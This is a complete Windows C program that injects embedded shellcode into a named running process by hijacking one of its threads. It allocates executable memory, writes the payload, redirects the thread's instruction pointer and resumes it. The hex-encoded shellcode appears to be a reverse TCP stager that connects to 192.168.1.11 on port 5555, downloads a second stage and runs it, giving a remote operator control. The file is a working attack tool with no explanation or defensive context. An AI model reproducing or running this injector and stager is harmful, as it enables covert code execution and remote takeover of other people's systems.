#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
"\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x01\x0b\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

DWORD getPid(const wchar_t* process) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD process_id = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] CreateToolhelp32Snapshot failed [%d]\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnapshot, &pe32)) {
        wprintf(L"[ERROR] Process32First failed [%d]\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_wcsicmp(pe32.szExeFile, process) == 0) {
            process_id = pe32.th32ProcessID;
            wprintf(L"Found process: %s with PID: %d\n", process, process_id);
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return process_id;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        fwprintf(stderr, L"Usage: %s <process>\n", argv[0]);
        wprintf(L"\nExample: %s notepad.exe\n", argv[0]);
        return 1;
    }

    const wchar_t* process = argv[1];
    DWORD pid = getPid(process);
    if (pid == 0) {
        wprintf(L"Process %s not found.\n", process);
        return 1;
    }

    wprintf(L"[+] PID: %d\n", pid);

    HANDLE hTargetProcess;
    HANDLE hThreadHijacked = NULL;
    HANDLE hSnapshot;
    PVOID pRemoteBuffer;
    THREADENTRY32 threadEntry;
    CONTEXT context;

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
    if (hTargetProcess == NULL) {
        wprintf(L"[ERROR] Could not open process [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] Process open successfully!\n");

    pRemoteBuffer = VirtualAllocEx(hTargetProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        wprintf(L"[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
        CloseHandle(hTargetProcess);
        return 100;
    }
    printf("[+] Memory allocated at %p\n", pRemoteBuffer);

    if (!WriteProcessMemory(hTargetProcess, pRemoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        wprintf(L"[ERROR] Could not write to remote memory [%d]\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        return 101;
    }
    printf("[+] Shellcode has been written in the memory successfully!\n");

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] CreateToolhelp32Snapshot (thread) failed [%d]\n", GetLastError());
        CloseHandle(hTargetProcess);
        return 102;
    }

    if (!Thread32First(hSnapshot, &threadEntry)) {
        wprintf(L"[ERROR] Thread32First failed [%d]\n", GetLastError());
        CloseHandle(hSnapshot);
        CloseHandle(hTargetProcess);
        return 103;
    }

    do {
        if (threadEntry.th32OwnerProcessID == pid) {
            hThreadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            if (hThreadHijacked) break;
        }
    } while (Thread32Next(hSnapshot, &threadEntry));

    if (hThreadHijacked == NULL) {
        wprintf(L"[ERROR] Could not open thread [%d] - Thread not found\n", GetLastError());
        CloseHandle(hSnapshot);
        CloseHandle(hTargetProcess);
        return 106;
    }

    printf("[+] Thread captured successfully!\n");

    SuspendThread(hThreadHijacked);

    if (!GetThreadContext(hThreadHijacked, &context)) {
        wprintf(L"[ERROR] GetThreadContext failed [%d]\n", GetLastError());
        CloseHandle(hThreadHijacked);
        CloseHandle(hTargetProcess);
        return 104;
    }

    context.Rip = (DWORD_PTR)pRemoteBuffer;
    if (!SetThreadContext(hThreadHijacked, &context)) {
        wprintf(L"[ERROR] SetThreadContext failed [%d]\n", GetLastError());
        CloseHandle(hThreadHijacked);
        CloseHandle(hTargetProcess);
        return 105;
    }

    ResumeThread(hThreadHijacked);

    printf("[+] Operation done successfully!\n");
    return 0;
}
